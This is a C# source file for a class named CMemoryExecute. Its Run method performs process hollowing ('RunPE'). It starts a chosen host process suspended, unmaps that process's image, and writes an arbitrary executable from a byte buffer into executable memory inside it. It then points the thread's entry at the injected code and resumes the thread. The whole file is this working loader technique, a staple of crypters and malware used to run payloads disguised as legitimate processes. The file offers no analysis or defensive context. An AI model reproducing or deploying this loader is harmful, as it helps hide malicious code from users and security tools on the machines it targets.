using System;
using System.Runtime.InteropServices;
public static unsafe class CMemoryExecute
{
    public static bool Run(byte[] exeBuffer, string hostProcess, string optionalArguments = "")
    {
        var IMAGE_SECTION_HEADER = new byte[0x28]; // pish
        var IMAGE_NT_HEADERS = new byte[0xf8]; // pinh
        var IMAGE_DOS_HEADER = new byte[0x40]; // pidh
        var PROCESS_INFO = new int[0x4]; // pi
        var CONTEXT = new byte[0x2cc]; // ctx

        byte* pish;
        fixed (byte* p = &IMAGE_SECTION_HEADER[0])
            pish = p;

        byte* pinh;
        fixed (byte* p = &IMAGE_NT_HEADERS[0])
            pinh = p;

        byte* pidh;
        fixed (byte* p = &IMAGE_DOS_HEADER[0])
            pidh = p;

        byte* ctx;
        fixed (byte* p = &CONTEXT[0])
            ctx = p;

        *(uint*)(ctx + 0x0 /* ContextFlags */) = CONTEXT_FULL;

        Buffer.BlockCopy(exeBuffer, 0, IMAGE_DOS_HEADER, 0, IMAGE_DOS_HEADER.Length);

        if (*(ushort*)(pidh + 0x0 /* e_magic */) != IMAGE_DOS_SIGNATURE)
            return false;

        var e_lfanew = *(int*)(pidh + 0x3c);

        Buffer.BlockCopy(exeBuffer, e_lfanew, IMAGE_NT_HEADERS, 0, IMAGE_NT_HEADERS.Length);

        if (*(uint*)(pinh + 0x0 /* Signature */) != IMAGE_NT_SIGNATURE)
            return false;

        if (!string.IsNullOrEmpty(optionalArguments))
            hostProcess += " " + optionalArguments;

        if (!CreateProcess(null, hostProcess, IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, new byte[0x44], PROCESS_INFO))
            return false;

        var ImageBase = new IntPtr(*(int*)(pinh + 0x34));
        NtUnmapViewOfSection((IntPtr)PROCESS_INFO[0] /* pi.hProcess */, ImageBase);
        if (VirtualAllocEx((IntPtr)PROCESS_INFO[0] /* pi.hProcess */, ImageBase, *(uint*)(pinh + 0x50 /* SizeOfImage */), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) == IntPtr.Zero)
            Run(exeBuffer, hostProcess, optionalArguments); // Memory allocation failed; try again (this can happen in low memory situations)

        fixed (byte* p = &exeBuffer[0])
            NtWriteVirtualMemory((IntPtr)PROCESS_INFO[0] /* pi.hProcess */, ImageBase, (IntPtr)p, *(uint*)(pinh + 84 /* SizeOfHeaders */), IntPtr.Zero);

        for (ushort i = 0; i < *(ushort*)(pinh + 0x6 /* NumberOfSections */); i++)
        {
            Buffer.BlockCopy(exeBuffer, e_lfanew + IMAGE_NT_HEADERS.Length + (IMAGE_SECTION_HEADER.Length * i), IMAGE_SECTION_HEADER, 0, IMAGE_SECTION_HEADER.Length);
            fixed (byte* p = &exeBuffer[*(uint*)(pish + 0x14 /* PointerToRawData */)])
                NtWriteVirtualMemory((IntPtr)PROCESS_INFO[0] /* pi.hProcess */, (IntPtr)((int)ImageBase + *(uint*)(pish + 0xc /* VirtualAddress */)), (IntPtr)p, *(uint*)(pish + 0x10 /* SizeOfRawData */), IntPtr.Zero);
        }

        NtGetContextThread((IntPtr)PROCESS_INFO[1] /* pi.hThread */, (IntPtr)ctx);
        NtWriteVirtualMemory((IntPtr)PROCESS_INFO[0] /* pi.hProcess */, (IntPtr)(*(uint*)(ctx + 0xAC /* ecx */)), ImageBase, 0x4, IntPtr.Zero);
        *(uint*)(ctx + 0xB0 /* eax */) = (uint)ImageBase + *(uint*)(pinh + 0x28 /* AddressOfEntryPoint */);
        NtSetContextThread((IntPtr)PROCESS_INFO[1] /* pi.hThread */, (IntPtr)ctx);
        NtResumeThread((IntPtr)PROCESS_INFO[1] /* pi.hThread */, IntPtr.Zero);

        return true;
    }

    #region WinNT Definitions

    private const uint CONTEXT_FULL = 0x10007;
    private const int CREATE_SUSPENDED = 0x4;
    private const int MEM_COMMIT = 0x1000;
    private const int MEM_RESERVE = 0x2000;
    private const int PAGE_EXECUTE_READWRITE = 0x40;
    private const ushort IMAGE_DOS_SIGNATURE = 0x5A4D; // MZ
    private const uint IMAGE_NT_SIGNATURE = 0x00004550; // PE00

    #region WinAPI
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, byte[] lpStartupInfo, int[] lpProcessInfo);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern uint NtUnmapViewOfSection(IntPtr hProcess, IntPtr lpBaseAddress);

    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern int NtWriteVirtualMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, IntPtr lpNumberOfBytesWritten);

    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern int NtGetContextThread(IntPtr hThread, IntPtr lpContext);

    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern int NtSetContextThread(IntPtr hThread, IntPtr lpContext);

    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern uint NtResumeThread(IntPtr hThread, IntPtr SuspendCount);
    #endregion

    #endregion
}